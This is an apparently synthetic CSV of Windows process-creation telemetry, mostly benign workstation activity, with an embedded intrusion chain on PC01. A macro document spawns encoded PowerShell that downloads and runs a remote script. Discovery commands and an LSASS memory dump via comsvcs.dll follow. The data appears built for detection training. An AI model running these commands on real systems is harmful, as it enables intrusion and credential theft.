event_id,timestamp,event_type,device,user,source,source_ref,process_name,process_id,command_line,parent_process_name,parent_process_id,file_path,sha256,signer,signature_status
evt-000198,2026-08-17T08:47:00+0000,process,PC07,SYSTEM,synthetic,,CcmExec.exe,2606,C:\Windows\CCM\CcmExec.exe,services.exe,748,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000199,2026-08-17T08:47:10+0000,process,PC05,klarsen,synthetic,,chrome.exe,1704,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,631,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000209,2026-08-17T08:48:53+0000,process,PC03,achen,synthetic,,powershell.exe,1519,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,772,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000212,2026-08-17T08:49:22+0000,process,PC02,mrossi,synthetic,,cmd.exe,9668,cmd.exe /c ipconfig /all,explorer.exe,769,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000216,2026-08-17T08:50:17+0000,process,PC01,jdoe,synthetic,,OneDrive.exe,8715,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,758,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid
evt-000218,2026-08-17T08:50:31+0000,process,PC02,SYSTEM,synthetic,,CcmExec.exe,6904,C:\Windows\CCM\CcmExec.exe,services.exe,865,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000219,2026-08-17T08:50:36+0000,process,PC07,adm_sarah,synthetic,,chrome.exe,1215,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,885,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000220,2026-08-17T08:50:39+0000,process,PC02,SYSTEM,synthetic,,MsMpEng.exe,4896,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,660,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000221,2026-08-17T08:50:46+0000,process,PC02,mrossi,synthetic,,Teams.exe,3270,"""C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,508,C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000222,2026-08-17T08:50:48+0000,process,PC02,mrossi,synthetic,,notepad.exe,8156,notepad.exe C:\Users\mrossi\Documents\todo.txt,explorer.exe,510,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid
evt-000224,2026-08-17T08:51:06+0000,process,PC07,adm_sarah,synthetic,,powershell.exe,5123,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,646,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000226,2026-08-17T08:51:46+0000,process,PC01,jdoe,synthetic,,cmd.exe,9782,cmd.exe /c ipconfig /all,explorer.exe,696,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000228,2026-08-17T08:52:06+0000,process,PC01,jdoe,synthetic,,Teams.exe,1303,"""C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,772,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000229,2026-08-17T08:52:19+0000,process,PC03,SYSTEM,synthetic,,CcmExec.exe,2561,C:\Windows\CCM\CcmExec.exe,services.exe,513,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000231,2026-08-17T08:52:39+0000,process,PC05,klarsen,synthetic,,powershell.exe,5517,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,755,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000233,2026-08-17T08:53:43+0000,process,PC07,SYSTEM,synthetic,,MsMpEng.exe,2221,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,871,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000234,2026-08-17T08:53:44+0000,process,PC01,jdoe,synthetic,,powershell.exe,4228,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\jdoe\Documents,explorer.exe,553,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000236,2026-08-17T08:53:52+0000,process,PC05,SYSTEM,synthetic,,svchost.exe,4163,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,901,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000240,2026-08-17T08:54:40+0000,process,PC05,klarsen,synthetic,,notepad.exe,3082,notepad.exe C:\Users\klarsen\Documents\todo.txt,explorer.exe,900,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid
evt-000241,2026-08-17T08:54:58+0000,process,PC01,jdoe,synthetic,,OUTLOOK.EXE,2382,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,718,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
evt-000242,2026-08-17T08:55:08+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,2339,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,675,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000244,2026-08-17T08:55:37+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,9624,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,597,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000248,2026-08-17T08:56:54+0000,process,PC05,klarsen,synthetic,,OUTLOOK.EXE,6774,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,836,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
evt-000249,2026-08-17T08:56:59+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,8295,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,824,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000250,2026-08-17T08:57:10+0000,process,PC07,adm_sarah,synthetic,,WINWORD.EXE,9656,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\adm_sarah\Documents\Notes.docx""",OUTLOOK.EXE,755,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid
evt-000252,2026-08-17T08:57:55+0000,process,PC01,jdoe,synthetic,,cmd.exe,8800,cmd.exe /c ipconfig /all,explorer.exe,918,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000253,2026-08-17T08:58:21+0000,process,PC05,klarsen,synthetic,,WINWORD.EXE,6889,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\klarsen\Documents\Notes.docx""",OUTLOOK.EXE,613,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid
evt-000256,2026-08-17T08:58:40+0000,process,PC03,achen,synthetic,,Teams.exe,1453,"""C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,844,C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000259,2026-08-17T08:59:14+0000,process,PC02,SYSTEM,synthetic,,svchost.exe,7803,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,892,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000263,2026-08-17T09:00:24+0000,process,PC03,achen,synthetic,,powershell.exe,3091,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\achen\Documents,explorer.exe,742,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000264,2026-08-17T09:00:28+0000,process,PC03,achen,synthetic,,Teams.exe,6468,"""C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,701,C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000265,2026-08-17T09:00:38+0000,process,PC02,SYSTEM,synthetic,,svchost.exe,2317,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,989,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000267,2026-08-17T09:00:46+0000,process,PC03,achen,synthetic,,cmd.exe,9601,cmd.exe /c ipconfig /all,explorer.exe,744,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000268,2026-08-17T09:00:48+0000,process,PC03,achen,synthetic,,chrome.exe,8417,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,713,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000271,2026-08-17T09:01:27+0000,process,PC05,SYSTEM,synthetic,,MsMpEng.exe,6001,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,956,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000273,2026-08-17T09:01:47+0000,process,PC05,klarsen,synthetic,,cmd.exe,1570,cmd.exe /c ipconfig /all,explorer.exe,537,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000274,2026-08-17T09:01:59+0000,process,PC02,mrossi,synthetic,,OneDrive.exe,6688,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,921,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid
evt-000275,2026-08-17T09:02:05+0000,process,PC07,adm_sarah,synthetic,,EXCEL.EXE,7042,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,635,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid
evt-000276,2026-08-17T09:02:06+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,7810,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,668,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000277,2026-08-17T09:02:10+0000,process,PC01,jdoe,synthetic,,cmd.exe,8347,cmd.exe /c ipconfig /all,explorer.exe,987,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000281,2026-08-17T09:03:27+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,9285,C:\Windows\CCM\CcmExec.exe,services.exe,816,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000282,2026-08-17T09:03:33+0000,process,PC03,achen,synthetic,,chrome.exe,7981,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,772,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000283,2026-08-17T09:03:36+0000,process,PC02,SYSTEM,synthetic,,CcmExec.exe,1767,C:\Windows\CCM\CcmExec.exe,services.exe,739,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000288,2026-08-17T09:04:43+0000,process,PC02,mrossi,synthetic,,Teams.exe,4650,"""C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,831,C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000292,2026-08-17T09:05:34+0000,process,PC01,jdoe,synthetic,,powershell.exe,2752,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\jdoe\Documents,explorer.exe,937,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000298,2026-08-17T09:06:29+0000,process,PC05,klarsen,synthetic,,OUTLOOK.EXE,4632,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,993,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
evt-000299,2026-08-17T09:07:06+0000,process,PC05,SYSTEM,synthetic,,svchost.exe,6752,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,782,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000300,2026-08-17T09:07:48+0000,process,PC02,mrossi,synthetic,,chrome.exe,7158,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,518,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000308,2026-08-17T09:08:36+0000,process,PC07,SYSTEM,synthetic,,svchost.exe,8034,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,512,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000311,2026-08-17T09:09:43+0000,process,PC02,mrossi,synthetic,,notepad.exe,8827,notepad.exe C:\Users\mrossi\Documents\todo.txt,explorer.exe,997,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid
evt-000312,2026-08-17T09:10:03+0000,process,PC07,adm_sarah,synthetic,,OneDrive.exe,2718,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,726,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid
evt-000313,2026-08-17T09:10:10+0000,process,PC02,SYSTEM,synthetic,,MsMpEng.exe,4349,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,573,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000314,2026-08-17T09:10:22+0000,process,PC03,achen,synthetic,,WINWORD.EXE,6458,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\achen\Documents\Notes.docx""",OUTLOOK.EXE,591,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid
evt-000315,2026-08-17T09:10:31+0000,process,PC07,adm_sarah,synthetic,,powershell.exe,3064,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,586,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000316,2026-08-17T09:10:40+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,6989,C:\Windows\CCM\CcmExec.exe,services.exe,506,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000318,2026-08-17T09:11:25+0000,process,PC03,achen,synthetic,,Teams.exe,9824,"""C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,773,C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid
evt-000320,2026-08-17T09:12:04+0000,process,PC01,jdoe,synthetic,,WINWORD.EXE,4820,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\jdoe\Downloads\Invoice_Q3_2026.docm""",OUTLOOK.EXE,3120,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid
evt-000322,2026-08-17T09:12:41+0000,process,PC01,jdoe,synthetic,,powershell.exe,6612,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA=,WINWORD.EXE,4820,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000325,2026-08-17T09:13:05+0000,process,PC02,SYSTEM,synthetic,,MsMpEng.exe,4487,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,653,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000332,2026-08-17T09:15:03+0000,process,PC01,jdoe,synthetic,,whoami.exe,7000,whoami.exe /all,powershell.exe,6612,C:\Windows\System32\whoami.exe,ad04c647be59a0820402e9149924d655340109d1229ee5cec15a3cb1ebdd5178,Microsoft Corporation,signed_valid
evt-000333,2026-08-17T09:15:10+0000,process,PC05,SYSTEM,synthetic,,MsMpEng.exe,7593,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,709,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000334,2026-08-17T09:15:20+0000,process,PC01,jdoe,synthetic,,net.exe,7001,"net group ""Domain Admins"" /domain",powershell.exe,6612,C:\Windows\System32\net.exe,b643b88cddf43f426d1231386a248f252872bebe45c773b70c0a3ac3c9c500ca,Microsoft Corporation,signed_valid
evt-000335,2026-08-17T09:15:22+0000,process,PC05,klarsen,synthetic,,powershell.exe,5874,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,794,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000336,2026-08-17T09:15:34+0000,process,PC07,SYSTEM,synthetic,,MsMpEng.exe,2686,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,848,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid
evt-000337,2026-08-17T09:15:37+0000,process,PC01,jdoe,synthetic,,nltest.exe,7002,nltest /domain_trusts,powershell.exe,6612,C:\Windows\System32\nltest.exe,02927cbf9632ab131899b67b8fbba9bf8221ab409e346290d5492c06708132a1,Microsoft Corporation,signed_valid
evt-000339,2026-08-17T09:17:31+0000,process,PC05,klarsen,synthetic,,cmd.exe,6608,cmd.exe /c ipconfig /all,explorer.exe,822,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid
evt-000344,2026-08-17T09:18:22+0000,process,PC01,jdoe,synthetic,,rundll32.exe,7420,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full",powershell.exe,6612,C:\Windows\System32\rundll32.exe,b2eefe9133c548f9834fe6fa1e3a142e55dc854a07b91e15606778e4eeadc8b2,Microsoft Corporation,signed_valid
evt-000355,2026-08-17T09:20:03+0000,process,PC02,mrossi,synthetic,,OUTLOOK.EXE,9251,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,545,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
evt-000359,2026-08-17T09:20:50+0000,process,PC02,mrossi,synthetic,,OUTLOOK.EXE,6192,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,646,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
evt-000360,2026-08-17T09:20:53+0000,process,PC07,adm_sarah,synthetic,,OneDrive.exe,1259,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,576,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid
evt-000364,2026-08-17T09:21:45+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,8966,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,690,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid
evt-000366,2026-08-17T09:22:07+0000,process,PC03,achen,synthetic,,chrome.exe,6763,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,635,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid
evt-000369,2026-08-17T09:22:31+0000,process,PC02,mrossi,synthetic,,WINWORD.EXE,3574,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\mrossi\Documents\Notes.docx""",OUTLOOK.EXE,820,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid
evt-000371,2026-08-17T09:22:43+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,2527,C:\Windows\CCM\CcmExec.exe,services.exe,697,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid
evt-000373,2026-08-17T09:23:15+0000,process,PC01,jdoe,synthetic,,powershell.exe,2809,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,949,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid
evt-000375,2026-08-17T09:23:47+0000,process,PC07,adm_sarah,synthetic,,OUTLOOK.EXE,1846,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,993,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid
